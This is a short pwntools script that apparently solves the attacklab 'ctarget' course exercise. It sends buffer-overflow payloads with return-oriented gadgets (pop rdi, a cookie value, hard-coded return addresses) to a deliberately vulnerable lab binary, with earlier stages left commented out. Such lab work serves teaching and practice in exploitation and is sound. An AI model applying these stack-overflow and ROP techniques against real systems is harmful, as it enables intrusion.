from pwn import *
context.log_level = 'debug'
p = process("./ctarget -q","-q")

gdb.attach(p,"break *0x4017a8")

#raw_input()
#part 1
# payload = b"\x00"*0x28 + p64(0x4017C0)

# p.sendlineafter("Cookie:",payload)

#part 2
#0x40141b : pop rdi ; ret
# pop_rdi_ret = 0x40141b
# cookie = int(p.recvline()[-11:-1],16)
# print(hex(cookie))
# payload = b"\x00"*0x28 
# payload += p64(pop_rdi_ret) 
# payload += p64(cookie)
# payload += p64(0x4017EC)
# p.sendline(payload)

#part 3
pop_rdi_ret = 0x40141b
cookie = int(p.recvline()[-9:-1],16)
print(str(hex(cookie))[2:])

payload = b"\x00"*0x28 
payload += p64(pop_rdi_ret) 
payload += p64(0x5561dcb8)
payload += p64(0x4018fa)
payload += str(hex(cookie))[2:].encode("utf-8")
p.sendline(payload)

p.interactive()


